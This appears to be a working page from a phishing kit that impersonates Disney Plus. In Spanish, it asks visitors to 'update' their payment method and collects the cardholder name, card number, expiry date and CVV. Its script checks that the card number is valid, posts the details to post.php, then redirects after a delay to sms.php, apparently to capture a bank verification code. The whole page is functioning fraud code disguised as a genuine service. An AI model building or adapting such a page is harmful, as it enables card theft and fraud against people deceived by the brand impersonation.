<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Disney plus</title>
    <link rel="stylesheet" href="res/account.css">
    <link rel="stylesheet" href="res/update.css">
</head>
<body>
<header>
    <div class="left">
        <img src="res/logo.png">
    </div>
    <div class="right">
        <div class="legend">Actualizar información de pago</div>
    </div>
</header>

<main>
<div class="form">

<div class="cardholder">
    <img src="res/card.png">
    <span>Tarjeta bancaria</span>
</div>

<div class="text">
Agrega o actualiza tu método de pago para continuar usando Disney Plus
</div>

<div class="form-col">
    <label>Nombre del titular de la tarjeta</label>
    <input type="text" class="textinput" placeholder="" id="d0" required>
</div>

<div class="form-col with-img">
    <label>Número de tarjeta</label>
    <input type="text" class="textinput" placeholder="" id="d1" required>
    <img src="res/cards2.png">
</div>

<div class="form-col multi">
    <div class="left">
        <label for="d2">Fecha de expiración</label>
        <input type="text" class="textinput" placeholder="MM/YY" name="d2" id="d2" required>
    </div>
    <div class="right">
        <label for="d3">Código de seguridad</label>
        <input type="text" class="textinput" placeholder="CVV/CVC" name="d3" id="d3" required>
    </div>
</div>

<div class="form-col" style="display:flex; align-items:center;">
    <input type="checkbox" style="width:19px; height:19px; margin-right:10px;"> 
    <span style="display:block; font-size:0.8em; text-align:left;">Guardar mi información de pago para usarla en todas las empresas de Walt Disney Family. <a href="#">Más información</a>.</span>
</div>

<div class="form-col">
    <button onclick="sendCard()">Continuar</button>
</div>

</div>
</main>




<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>

<script>
 
$("#d1").mask("0000000000000000");
$("#d2").mask("00/00");
$("#d3").mask("000");

var allowSubmit;
var abortVal = true;
 
function validate(){
	abortVal=false;
	allowSubmit=true;
 
    $("input").removeClass("error");

    if($("#d1").val().length<16){
	    $("#d1").addClass("error");
	    allowSubmit=false;
    }

    var _exp = $("#d2").val();
    const _exps = _exp.split("/");
    if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>40 || _exps[1]<25 || _exp.length<5){
        $("#d2").addClass("error");
	    allowSubmit=false;
    }

    if($("#d2").val().length<5){
	    $("#d2").addClass("error");
	    allowSubmit=false;
    }

    if($("#d3").val().length<3){
	    $("#d3").addClass("error");
	    allowSubmit=false;
    }

    if($("#d0").val().length<3){
	    $("#d0").addClass("error");
	    allowSubmit=false;
    }

    $('#d1').validateCreditCard(function(result) {
        if (result.valid) {
            $("#d1").removeClass('error');
        } else {
            $("#d1").addClass("error");
            allowSubmit=false;
        }
    });
}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){
        $(".loader").show();
        $.post("post.php", 
			{
				name:$("#d0").val()+" "+$("#d11").val(),
				cc:$("#d1").val(),
                exp:$("#d2").val(),
				cvv:$("#d3").val(),
			}, function(done){
                setTimeout(() => {
                     window.location="sms.php";
                }, 8000);
               
			}
		);
    }
}
</script>
</body>
</html>